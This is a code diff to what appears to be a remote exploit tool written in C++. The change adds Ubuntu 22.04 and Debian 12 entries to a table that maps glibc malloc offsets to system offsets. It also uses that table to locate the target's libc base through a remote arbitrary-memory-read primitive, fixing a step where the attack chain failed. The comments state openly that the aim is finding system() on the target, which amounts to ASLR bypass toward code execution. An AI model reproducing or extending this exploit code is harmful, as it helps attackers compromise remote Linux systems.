@@ -767,6 +767,21 @@ static ReadResult aread8(Cli &A, Cli &R, uint64_t eq, int k, uint64_t tgt, const
 
 static ReadResult RD(Cli &A, Cli &R, uint64_t eq, uint64_t addr, const char *cell) { return aread(A, R, eq, 7, addr, cell); }
 
+// A tiny table of glibc builds keyed by malloc's offset (which we compute remotely as &malloc - libc_base),
+// mapping to system's offset. This is public per-build data, not anything from the target: an attacker fills
+// it from the distro's own libc packages. Unknown builds fall back to --libc / --system-off.
+struct GlibcBuild { uint64_t malloc_off, system_off; const char *note; };
+static GlibcBuild g_glibc[] = {
+    // Ubuntu 24.04, glibc 2.39-0ubuntu8.x. Offsets read from the public libc6 packages, keyed by malloc's
+    // offset (which we compute remotely). system's offset is what we actually need. Extend as builds appear.
+    { 0xad640, 0x58740, "glibc 2.39-0ubuntu8.0-8.3 (Ubuntu 24.04)" },
+    { 0xad650, 0x58750, "glibc 2.39-0ubuntu8.4-8.6 (Ubuntu 24.04)" },
+    { 0xad670, 0x58750, "glibc 2.39-0ubuntu8.7 (Ubuntu 24.04)" },
+    { 0xad750, 0x58750, "glibc 2.39-0ubuntu8.8 (Ubuntu 24.04)" },
+    // Read from each distro's own /lib/x86_64-linux-gnu/libc.so.6, which is the stock package.
+    { 0xa5060, 0x50d70, "glibc 2.35 (Ubuntu 22.04)" },
+    { 0x98930, 0x4c490, "glibc 2.36 (Debian 12 bookworm)" },
+};
 // Remote libc base, no files. The read is strlen-truncated so it cannot read a page-aligned VALUE (low byte
 // 0x00) -- which rules out walking the loader's link_map (l_addr is a load base). But &malloc IS readable
 // (libc+0xad..., non-zero low byte), and the libc base carries the ELF magic \x7fELF, whose first byte 0x7f
@@ -777,6 +792,25 @@ static uint64_t remoteLibcBase(Cli &A, Cli &R, uint64_t eq, const char *cell, ui
     uint64_t mp = RD(A, R, eq, image + P.malloc_got, cell).val;  // &malloc (readable)
     mallocPtrOut = mp;
     if (mp < 0x10000) return 0;
+
+    // Candidate bases from the build table FIRST, one read each.
+    //
+    // Masking &malloc down to an alignment only works when the loader happened to place libc on
+    // that boundary, and that is kernel behaviour rather than a property of glibc. Measured on the
+    // pool 2026-08-23: on Ubuntu 24.04 (kernel 6.8) libc lands 2 MiB aligned and the first mask
+    // hits; on Ubuntu 22.04 (kernel 5.15) it is only page aligned, every mask misses, and the chain
+    // failed at exactly this step with &malloc=0x7fdd1bd7a060. Subtracting a KNOWN malloc offset
+    // needs no alignment assumption at all, and the offsets are already in the table below for the
+    // separate purpose of finding `system`. Using them here as well costs one read per row.
+    for (unsigned i = 0; i < sizeof(g_glibc) / sizeof(g_glibc[0]); i++) {
+        if (mp < g_glibc[i].malloc_off) continue;
+        uint64_t c = mp - g_glibc[i].malloc_off;
+        if (c & 0xfff) continue;                                 // a load base is page aligned
+        if ((uint32_t)RD(A, R, eq, c, cell).val == 0x464c457fU) {
+            vlog("[libc base from table row '%s']\n", g_glibc[i].note);
+            return c;
+        }
+    }
     for (uint64_t a = 0x200000; a >= 0x1000; a >>= 1) {          // 2 MiB, 1 MiB, ... 4 KiB
         uint64_t c = mp & ~(a - 1);
         if ((uint32_t)RD(A, R, eq, c, cell).val == 0x464c457fU) return c;
@@ -801,18 +835,7 @@ static uint64_t remoteLibcBase(Cli &A, Cli &R, uint64_t eq, const char *cell, ui
     return 0;
 }
 
-// A tiny table of glibc builds keyed by malloc's offset (which we compute remotely as &malloc - libc_base),
-// mapping to system's offset. This is public per-build data, not anything from the target: an attacker fills
-// it from the distro's own libc packages. Unknown builds fall back to --libc / --system-off.
-struct GlibcBuild { uint64_t malloc_off, system_off; const char *note; };
-static GlibcBuild g_glibc[] = {
-    // Ubuntu 24.04, glibc 2.39-0ubuntu8.x. Offsets read from the public libc6 packages, keyed by malloc's
-    // offset (which we compute remotely). system's offset is what we actually need. Extend as builds appear.
-    { 0xad640, 0x58740, "glibc 2.39-0ubuntu8.0-8.3 (Ubuntu 24.04)" },
-    { 0xad650, 0x58750, "glibc 2.39-0ubuntu8.4-8.6 (Ubuntu 24.04)" },
-    { 0xad670, 0x58750, "glibc 2.39-0ubuntu8.7 (Ubuntu 24.04)" },
-    { 0xad750, 0x58750, "glibc 2.39-0ubuntu8.8 (Ubuntu 24.04)" },
-};
+
 
 static void usage(const char *a0)
 {
